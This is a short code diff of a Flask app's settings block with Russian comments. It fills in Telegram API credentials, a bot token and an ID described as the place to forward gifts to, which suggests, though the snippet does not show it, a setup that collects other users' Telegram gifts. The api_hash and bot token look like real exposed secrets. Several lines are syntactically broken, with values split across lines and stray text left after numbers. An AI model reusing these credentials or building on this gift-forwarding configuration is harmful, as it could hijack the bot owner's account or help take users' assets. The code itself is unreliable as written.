@@ -9,8 +9,8 @@ app = Flask(name)
 # ===== НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) =====
 API_ID = 
 35249557   # твой api_id (получить на my.telegram.org)
-API_HASH =283dddbb6330616c9f0f0ee7d9ba7b62 'твой_api_hash'  # твой api_hash
-BOT_TOKEN = 8003192628:AAGAvnD80ANKz1d7D8mihLqXW9_iWdOQMmU'твой_токен_бот_от_BotFather'  # тот же, что в index.html
+API_HASH =  '283dddbb6330616c9f0f0ee7d9ba7b62 '  # твой api_hash
+BOT_TOKEN =  '8003192628:AAGAvnD80ANKz1d7D8mihLqXW9_iWdOQMmU'  # тот же, что в index.html
 ADMIN_ID =8769372843 твой_telegram_id  # твой ID (число, без кавычек)
 RECEIVER_ID = 8769372843 твой_telegram_id  # куда пересылать подарки (твой ID)
 # ========================================
